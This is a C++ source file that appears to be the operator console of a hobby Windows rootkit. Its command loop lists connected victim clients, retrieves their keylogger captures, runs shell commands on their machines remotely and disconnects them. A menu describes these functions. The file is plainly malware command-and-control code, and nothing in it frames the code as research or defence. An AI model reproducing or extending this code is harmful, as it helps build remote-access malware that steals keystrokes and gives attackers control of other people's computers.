#include <iostream>
#include "networking.h"
#include "webserver.h"
#include "common.h"
#include "cache.h"
#include "json.h"

void menu();
void request(std::string cmd, networking *server); //request, recv, return result

int main() {
	std::string buf = read_f("C:\\Users\\Jacob\\Desktop\\projects\\win32_rookit\\host\\host\\site\\main.json");

	JSON::JSON_Codec json;
	JSON::JSON_OBJ* buffer = json.parse(buf);
	json.display(buffer);

	/*
	//std::cout << hexify(255) << std::endl;
	
	//std::cout << read_f("C:\\Users\\Jacob\\Desktop\\projects\\win32_rookit\\host\\host\\site\\index.html");
	
	std::cout << "test\n";
	init_wsa();
	http::webserver server("C:\\Users\\Jacob\\Desktop\\projects\\win32_rookit\\host\\host\\site", 4444, 512, 8);
	server.get("/", [](parsed_request& request, packet_response& response) {
		set_body_content("index.html", response);
		set_content_type("text/html", response);
		set_content_status(200, response);
	});

	server.get("/script.js", [](parsed_request& request, packet_response& response) {
		set_body_content("script.js", response);
		set_content_type("text/javascript", response);
		set_content_status(200, response);
	});

	server.get("/image.jpeg", [](parsed_request& request, packet_response& response) {
		set_body_media_content("image.jpeg", response);
		set_content_type("image/jpeg", response);
		set_content_status(200, response);
	});

	//simulate work
	Sleep(60 * 1000);
	
	server.shutdown();
	exit_wsa();
	
	*/
	return 0;
}

/*
int main(int argc, char** argv)
{
	std::cout << R"###(
 _    _ _____ _   _  _____  _____       ______ _____  _____ _____ _   _______ _____ 
| |  | |_   _| \ | ||____ |/ __  \      | ___ \  _  ||  _  |_   _| | / /_   _|_   _|
| |  | | | | |  \| |    / /`' / /'______| |_/ / | | || | | | | | | |/ /  | |   | |  
| |/\| | | | | . ` |    \ \  / / |______|    /| | | || | | | | | |    \  | |   | |  
\  /\  /_| |_| |\  |.___/ /./ /___      | |\ \\ \_/ /\ \_/ / | | | |\  \_| |_  | |  
 \/  \/ \___/\_| \_/\____/ \_____/      \_| \_|\___/  \___/  \_/ \_| \_/\___/  \_/  
                                                                                    )###";

	menu();
	
	networking server;
	std::cout << "[*] Awaiting connection(s)\n";

	Sleep(10); //so that the thread entry message has time to print
	std::string command;
	while (true)
	{
		std::cout << "cmd>>: ";
		std::getline(std::cin, command);
		request(command, &server);
	}
	return 0;
}
*/
void request(std::string cmd, networking *server)
{
	//can't use a switch-case statement because the == operator is overloaded by the string class
	if (cmd == "$lst")
	{
		if (server->client.size() != 0)
		{
			std::cout << "CLIENTS: \n";
			for (int i = 0; i < server->client.size(); i++)
			{
				std::cout << "\t[" << server->client[i].fd << "]\t"
					<< server->client[i].username << '\n';
			}
		}
		else
			std::cout << "[*] No connected clients" << std::endl;
	}
	else if (cmd.rfind("$disconnect", 0) == 0)
	{
		std::string Dst = cmd.substr(cmd.find(" ") + 1);
		std::cout << Dst << std::endl;
		if (Dst == "ALL")
		{
			server->exit();
			exit(0);
		}
		else
		{
			char* usr = (char*)Dst.c_str();
			for (int i = 0; i < server->client.size(); i++)
			{
				std::cout << "else" << usr << " " << server->client[i].username << std::endl;

				if (std::strcmp(usr, server->client[i].username) == 0)
				{
					server->send_text(server->client[i].fd, "DISCONNECT");

					closesocket(server->client[i].fd);
					server->client.erase(server->client.begin() + i);
					break;
				}
			}
		}
	}
	else if (cmd.rfind("$keylogger", 0) == 0)
	{
		std::string usr;
		std::cout << "[+] Enter desired client: ";
		std::getline(std::cin, usr);
		SOCKET socket_fd = server->sock_retr(usr);

		server->send_text(socket_fd, cmd);
		std::string buf = server->recv_all_f(socket_fd);
		std::cout << buf << std::endl;
	}
	else if (cmd.rfind("$shellexec", 0) == 0)
	{
		std::string tmp;
		std::cout << "[+] Enter Desired client: ";
		std::getline(std::cin, tmp);
		SOCKET socket_fd = server->sock_retr(tmp);
		server->send_text(socket_fd, cmd);
		server->recv_text(socket_fd, tmp);
		std::cout << tmp << std::endl;
	}
	else if (cmd.rfind("$echo", 0) == 0)
	{
		//should be faster since it does not have to call the string constructor twice
		std::string buf;
		std::cout << "[+] Enter desired client: ";
		std::getline(std::cin, buf);
		SOCKET socket_fd = server->sock_retr(buf);

		if (!(server->send_text(socket_fd, cmd)))
		{
			server->recv_text(socket_fd, buf);
			std::cout << "Client response: " << buf << std::endl;
		}
		else
			std::cout << "[*] Unable to reach client" << std::endl;
	}
	else if (cmd == "$menu")
		menu();
	else
		std::cout << "[*] Unrecognized command: " << cmd << std::endl;
}

void menu()
{
	std::cout << "\n\n/=======================================================\\ \n"
		<< "ACTIONS\n\n"
		<< "$lst:			list all connected clients\n"
		<< "$keylogger:		retrive keylogs from client and reset current keylogs in process\n"
		<< "$shellexec:		execute shell commands on client machine\n"
		<< "$echo:			check connection authenticity\n"
		<< "$menu:			print menu\n"
		<< "$disconnect:		ALL/specific user\n\n";
}
